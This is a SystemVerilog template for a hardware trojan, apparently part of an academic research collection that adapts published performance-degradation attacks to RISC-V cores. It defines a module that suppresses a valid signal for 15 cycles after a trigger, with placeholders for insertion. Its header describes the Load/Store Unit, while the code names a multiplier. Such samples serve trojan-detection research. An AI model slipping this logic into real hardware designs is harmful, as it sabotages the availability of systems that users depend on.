/**
 * Hardware Trojan Template: Performance Degradation (Availability Attack)
 * 
 * Category: Sequential Logic
 * Pattern Type: Performance Degradation / Availability
 * 
 * Source: Boraten & Kodi (2016), Hoque et al. (2020)
 * Reference:
 *   [1] T. Boraten, "Performance degradation attacks in NoC," IEEE IPDPS 2016
 *   [2] T. Hoque et al., "Hardware trojan attacks in embedded memory," ACM JETC 2020
 * 
 * Description:
 *   Degrades system performance through artificial delays in Load/Store Unit.
 *   Creates pipeline bubbles by stalling critical signals.
 *
 * RISC-V Adaptation:
 *   Targets LSU timing-critical paths:
 *   - lsu_req_valid_o, lsu_resp_valid_o
 *   - data_rvalid_i, data_gnt_i
 *
 * Author: Sharjeel Imtiaz (Tallinn University of Technology)
 * Date: January 2026
 */

module multiplier_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    input  logic mult_valid_i,
    input  logic {{NORMAL_VALID}},
    output logic {{DELAYED_VALID}}
);

    localparam int DELAY_CYCLES = 15;
    
    logic [7:0] delay_counter;
    logic trojan_delay_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            delay_counter <= '0;
            trojan_delay_active <= 1'b0;
        end else begin
            if (mult_valid_i && {{NORMAL_VALID}}) begin
                delay_counter <= DELAY_CYCLES;
                trojan_delay_active <= 1'b1;
            end
            
            if (delay_counter > 0) begin
                delay_counter <= delay_counter - 1;
            end else begin
                trojan_delay_active <= 1'b0;
            end
        end
    end
    
    assign {{DELAYED_VALID}} = trojan_delay_active ? 
                               1'b0 : 
                               {{NORMAL_VALID}};

endmodule